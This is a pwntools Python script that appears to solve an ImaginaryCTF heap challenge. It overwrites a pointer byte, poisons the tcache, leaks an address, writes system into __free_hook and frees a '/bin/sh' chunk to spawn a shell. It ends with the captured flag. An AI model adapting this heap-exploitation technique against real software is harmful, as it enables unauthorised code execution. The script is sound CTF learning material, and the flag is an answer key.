from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# io = process("./vuln")
# io = gdb.debug("./vuln", "c")
io = remote("puzzler7.imaginaryctf.org", 11000)


def create(id, name):
    io.sendlineafter(b"into space", b"c")
    io.sendlineafter(b"ID", str(id).encode())
    io.sendlineafter(b"name", name)


def free(id):
    io.sendlineafter(b"into space", b"l")
    io.sendlineafter(b"Which", str(id).encode())


for _ in range(14):
    create(0, b"peko")
# now mem[0] & 0xff == 0

create(1, b"a" * 32)  # override the lsb of mem[1] bio address, so mem[0]->bio == mem[1]
io.sendline(b"")  # fix some problem about input buffer

# setup tcache list
create(2, b"miko")
free(2)
free(0)

# leak address
io.sendlineafter(b"into space", b"\0")
io.sendlineafter(b"size", str(65536 * 256).encode())
io.recvuntil(b"at ")
mmapped = int(io.recvuntil(b".")[:-1].decode(), 16)
print(f"{mmapped = :#x}")
free_hook = mmapped + 0x11EFB18
print(f"{free_hook = :#x}")
system = mmapped + 0x1056400
print(f"{system = :#x}")

# overwrite mem[0] next pointer to __free_hook
io.sendlineafter(b"into space", b"m")
io.sendlineafter(b"Which", b"1")
io.sendlineafter(b"Tell me", p64(free_hook))

create(3, b"/bin/sh")  # allocate original mem[0] chunk
create(4, p64(system))  # write to free_hook
free(3)  # system("/bin/sh")

io.interactive()

# ictf{an_entire_heap_of_@stros!}
